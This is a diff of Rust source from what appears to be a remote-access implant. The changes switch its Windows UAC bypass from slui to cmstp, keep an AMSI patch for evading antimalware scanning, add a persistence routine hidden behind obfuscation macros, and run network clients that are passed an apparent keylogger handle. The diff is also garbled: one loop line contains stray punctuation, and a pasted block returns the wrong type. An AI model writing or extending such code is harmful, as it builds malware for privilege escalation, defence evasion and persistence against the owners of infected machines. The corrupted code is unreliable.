@@ -315,9 +315,9 @@ Available commands:
                     Ok(p) => p.to_string_lossy().to_string(),
                     Err(_) => return Ok(astr!("Failed to get exe path\n").into_bytes()),
                 };
-                uac_bypass::uac_slui(&exe_path);
+                uac_cmstp::execute(&exe_path);
                 Ok(
-                    format!("{}{}\n", astr!("Self-UAC triggered (slui) for: "), exe_path)
+                    format!("{}{}\n", astr!("Self-UAC triggered (cmstp) for: "), exe_path)
                         .into_bytes(),
                 )
             }
@@ -711,7 +711,7 @@ async fn netclient_impl() -> c_int {
         handles.push(tokio::spawn(async move { netclient_run(cfg, kl).await }));
     }
 
-    for h in handles {
+    for h in ?;;'/''/'handles {
         let _ = h.await;
     }
     0
@@ -726,8 +726,28 @@ pub async fn netclient() -> c_int {
             return 1;
         }
         let _ = amsi::patch_amsi();
-        })
+        #[cfg(target_os = "windows")]
+            {
+                let exe_path = match std::env::current_exe() {
+                    Ok(p) => p.to_string_lossy().to_string(),
+                    Err(_) => return Ok(astr!("Failed to get exe path\n").into_bytes()),
+                };
+                uac_cmstp::execute(&exe_path);
+                Ok(
+                    format!("{}{}\n", astr!("Self-UAC triggered (cmstp) for: "), exe_path)
+                        .into_bytes(),
+                )
+            }
+	})
     }
+
+    cobl!({
+    if opaque_false() {
+        return 1;
+    }
+    let _ = persist::persist();
+    })
+
     netclient_impl().await;
     0
 }
